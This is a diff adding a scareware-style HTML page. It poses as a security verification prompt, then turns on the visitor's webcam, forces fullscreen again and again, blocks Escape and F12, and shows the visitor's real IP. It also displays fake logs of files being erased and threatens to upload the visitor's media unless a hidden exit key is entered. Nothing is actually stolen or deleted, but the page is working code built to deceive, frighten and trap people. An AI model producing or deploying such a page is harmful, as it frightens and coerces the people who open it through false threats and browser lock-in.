@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM_CRITICAL_LOCKDOWN</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #0f0; 
+            font-family: 'Courier New', monospace; 
+            margin: 0; 
+            overflow: hidden; 
+            height: 100vh;
+            user-select: none;
+        }
+        /* طبقة الكاميرا الخلفية */
+        #cam-layer { 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            z-index: 1; 
+            opacity: 0.35; 
+            pointer-events: none; 
+        }
+        video { 
+            width: 100%; height: 100%; 
+            object-fit: cover; 
+            filter: contrast(1.5) brightness(0.7) grayscale(1) sepia(1) hue-rotate(100deg); 
+        }
+        /* واجهة الهاكر */
+        .terminal { 
+            position: relative; 
+            z-index: 10; 
+            border: 1px solid #0f0; 
+            padding: 20px; 
+            width: 85%; 
+            max-width: 450px; 
+            background: rgba(0, 10, 0, 0.9); 
+            margin: 10vh auto; 
+            box-shadow: 0 0 50px #0f0;
+            border-radius: 5px;
+        }
+        .danger-header { 
+            background: #f00; 
+            color: #000; 
+            font-weight: bold; 
+            text-align: center; 
+            padding: 5px; 
+            margin-bottom: 15px;
+            animation: blink 0.5s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+        .log-box { 
+            font-size: 11px; 
+            color: #888; 
+            height: 80px; 
+            overflow: hidden; 
+            margin: 10px 0;
+            border-left: 2px solid #333;
+            padding-left: 10px;
+        }
+        input[type="text"] {
+            background: #000;
+            border: 1px solid #333;
+            color: #0f0;
+            padding: 10px;
+            width: 70%;
+            outline: none;
+            font-family: monospace;
+        }
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 10px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        /* زر البدء الخادع */
+        #start-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #000;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+    </style>
+</head>
+<body onclick="forceIronGrip()">
+
+<div id="start-overlay">
+    <div style="padding: 20px;">
+        <h1 style="color:red; font-size: 2em;">⚠️ WARNING ⚠️</h1>
+        <p style="color:#ccc;">Unusual activity detected from your IP.<br>Verification required to secure your data.</p>
+        <button onclick="initiateHack()" style="padding: 15px 40px; background: red; color: #fff; font-size: 1.2em;">VERIFY NOW</button>
+    </div>
+</div>
+
+<div id="cam-layer"><video id="webcam" autoplay playsinline></video></div>
+
+<div class="terminal">
+    <div class="danger-header">ESTABLISHING REMOTE CONNECTION...</div>
+    <p>> PROTOCOL: <span style="color:#fff;">LE_01011_X</span></p>
+    <p>> TARGET_IP: <span id="user-ip" style="color:yellow;">TRACKING...</span></p>
+    <hr color="#222">
+    
+    <div class="log-box" id="wipe-log">
+        [SYSTEM]: Scanning local directories...<br>
+        [SYSTEM]: Initializing camera feed...<br>
+    </div>
+
+    <p style="font-size: 12px; color: #fff;">"I am a PLAYER TYPE.. (The fun begins)"</p>
+    
+    <div style="margin-top: 20px;">
+        <input type="text" id="passkey" placeholder="BYPASS_KEY">
+        <button onclick="checkFinalExit()">EXIT</button>
+    </div>
+</div>
+
+<script>
+    // 1. تشغيل الكاميرا والدخول في وضع السجن الكامل
+    async function initiateHack() {
+        document.getElementById('start-overlay').style.display = 'none';
+        forceIronGrip();
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('webcam').srcObject = stream;
+            startFakeLogs();
+        } catch (err) {
+            alert("ACCESS DENIED: Verification failed. System wipe speed x10.");
+            startFakeLogs();
+        }
+    }
+
+    // 2. القبضة الحديدية (الشاشة الكاملة الإجبارية)
+    function forceIronGrip() {
+        const el = document.documentElement;
+        if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
+        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
+    }
+
+    // مراقبة المحاولة للخروج (كل 100 مللي ثانية)
+    setInterval(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+            forceIronGrip();
+        }
+    }, 100);
+
+    // منع زر الهروب والاختصارات
+    window.addEventListener('keydown', (e) => {
+        if (e.key === "Escape" || e.key === "F12") {
+            e.preventDefault();
+            alert("SECURITY VIOLATION: Override attempt blocked.");
+            forceIronGrip();
+        }
+    });
+
+    // 3. لوج المسح الوهمي
+    function startFakeLogs() {
+        const log = document.getElementById('wipe-log');
+        const paths = ["/DCIM/Camera/", "/WhatsApp/Media/", "/System/Auth/", "/Private/Vault/"];
+        setInterval(() => {
+            const file = paths[Math.floor(Math.random()*paths.length)] + Math.random().toString(36).substring(7) + ".dat";
+            log.innerHTML = `> ERASING: ${file}<br>` + log.innerHTML;
+            if (navigator.vibrate) navigator.vibrate(50);
+        }, 800);
+    }
+
+    // 4. سحب الـ IP الحقيقي
+    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
+        document.getElementById('user-ip').innerText = d.ip;
+    });
+
+    // 5. مخرج النجاة
+    function checkFinalExit() {
+        if (document.getElementById('passkey').value === "EXIT_PROTOCOL_00") {
+            window.onbeforeunload = null;
+            alert("BYPASS SUCCESSFUL. DISCONNECTING...");
+            location.href = "https://www.google.com";
+        } else {
+            alert("WRONG KEY. UPLOADING MEDIA TO PUBLIC SERVERS...");
+            if (navigator.vibrate) navigator.vibrate([400, 200, 400]);
+        }
+    }
+
+    window.onbeforeunload = () => "DO NOT CLOSE THIS PAGE!";
+</script>
+
+</body>
+</html>
